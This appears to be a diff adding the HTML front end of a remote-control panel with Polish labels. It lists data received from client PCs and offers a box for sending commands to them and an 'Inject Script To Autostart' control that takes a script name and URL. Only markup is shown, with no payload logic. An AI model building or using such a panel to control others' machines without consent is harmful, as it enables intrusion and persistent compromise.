@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <script src="./app.js" defer></script>
+    <script src="./console.js" defer></script>
+    <script src="./popup.js" defer></script>
+
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="remoteStyle.css">
+
+    <title>PZS PCs IP</title>
+</head>
+<body>
+    <main>
+        <h1>Odebrane dane:</h1>
+        <div id="data-container"></div>
+    </main>
+
+    <div id="popup" class="widziszMnie">
+        <button class="exit" onclick="popupClose()">X</button>
+        <div id="main">
+            
+            <div id="console">
+                <img src="./assets/XD.gif" alt="XD">
+            </div>
+    
+            <span>
+                <input type="text" id="input" placeholder="Wprowadź komendę">
+                <button onclick="sendCommand()">Wykonaj</button>
+            </span>
+    
+            <span>
+                <span class="script">
+                    <input placeholder="Script Name (example.pyw)" type="text" name="filename" id="filename">
+                    <input placeholder="URL to Script" type="text" name="fileurl" id="fileurl">
+                    <button onclick="InjectScript()" id="injectButton">Inject Script To Autostart</button>
+                </span>
+                <span id="client_info"></span>
+            </span>
+            
+        </div>
+    </div>
+    
+</body>
+</html>
